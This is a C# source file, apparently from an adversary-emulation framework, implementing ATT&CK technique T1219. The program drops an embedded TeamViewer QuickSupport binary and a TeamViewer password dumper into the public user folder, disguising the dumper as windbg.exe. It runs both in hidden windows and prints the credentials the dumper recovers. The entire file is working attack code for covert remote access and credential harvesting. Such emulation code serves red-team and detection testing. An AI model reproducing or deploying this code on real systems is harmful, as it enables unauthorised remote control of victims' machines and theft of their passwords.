using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;

class Technique
{
/*
    * 
    * T1219 (Remote Access Software).
    *
    *       TODO
    *       set the path as a parameter
    *       dump the teamviewer process and parse the possible passwords instead of using tv-dumper.exe

*/

    public static Dictionary<string, string> EntryData { get; set; }
    public static Dictionary<string, string> ExitData { get; set; }

    public static bool execCommand()
    {
        try
        {
            byte[] tvBytes = T1219.Properties.Resources.TeamViewerQS;
            File.WriteAllBytes(@"\Users\Public\TeamViewerQS.exe",tvBytes);

            byte[] dumperBytes = T1219.Properties.Resources.tv_dumper;
            File.WriteAllBytes(@"\Users\Public\windbg.exe", dumperBytes);

            System.Diagnostics.Process tvProcess = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = @"\Users\Public\TeamViewerQS.exe";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;

            tvProcess.StartInfo = startInfo;
            if (tvProcess.Start() == true){
                System.Diagnostics.Process dumperProcess = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo dumperInfo = new System.Diagnostics.ProcessStartInfo();

                dumperInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                dumperInfo.FileName = @"\Users\Public\windbg.exe";
                dumperInfo.RedirectStandardOutput = true;
                dumperInfo.UseShellExecute = false;

                //Sleep to wait for teamviewer
                Thread.Sleep(10000);

                dumperProcess.StartInfo = dumperInfo;
                dumperProcess.Start();
                dumperProcess.WaitForExit();

                string dumpOut = "[T1219]-[TeamViewer Dumper] " + dumperProcess.StandardOutput.ReadToEnd().Replace("\n", "\n[T1219]-[TeamViewer Dumper] ");
                Console.WriteLine(dumpOut);
                if (dumperProcess.ExitCode == 0)
                {
                    return true;
                }
            }
            
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error:" + ex.Message);
        }
        return false;
    }
    public static void Main(string[] args)
    {
        Console.WriteLine("[T1219] Starting Execution!");

        Console.WriteLine("[T1219] Dropping TV + TV Dumper.");
        if (execCommand()){
            Console.WriteLine("[T1219] Successfully executed Technique (return 0)! ");
        }else{
            Console.WriteLine("[T1219] Oops, something went wrong! ");
        }
    }
}